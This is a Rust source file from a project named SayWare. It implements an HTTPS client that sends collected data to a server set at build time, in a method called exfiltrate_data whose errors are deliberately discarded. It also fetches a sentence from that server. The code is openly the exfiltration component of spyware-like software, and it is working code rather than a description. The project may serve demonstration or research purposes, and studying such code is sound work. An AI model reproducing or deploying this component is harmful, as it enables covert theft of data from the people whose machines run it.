// SPDX-FileCopyrightText: 2025 The SayWare development team
//
// SPDX-License-Identifier: GPL-3.0-or-later

use reqwest::{Client as ReqwestClient, Result};
use sayware_types::ExfiltratedData;
use std::time::Duration;

include!(concat!(env!("OUT_DIR"), "/configuration.rs"));

pub struct Client {
    client: ReqwestClient,
    base_url: String,
}

impl Client {
    pub fn new() -> Result<Self> {
        Ok(Self {
            client: ReqwestClient::builder()
                .https_only(true)
                .timeout(Duration::from_secs(5))
                .build()?,
            base_url: format!("https://{SERVER_HOSTNAME}:{SERVER_PORT}/{SERVER_URL_PREFIX}/"),
        })
    }

    pub async fn exfiltrate_data(&self, data: ExfiltratedData) {
        let _ = self.client.post(&self.base_url).json(&data).send().await;
    }

    pub async fn get_sentence(&self) -> String {
        let Ok(response) = self.client.get(&self.base_url).send().await else {
            return FALLBACK_SENTENCE.into();
        };

        response.text().await.unwrap_or(FALLBACK_SENTENCE.into())
    }
}
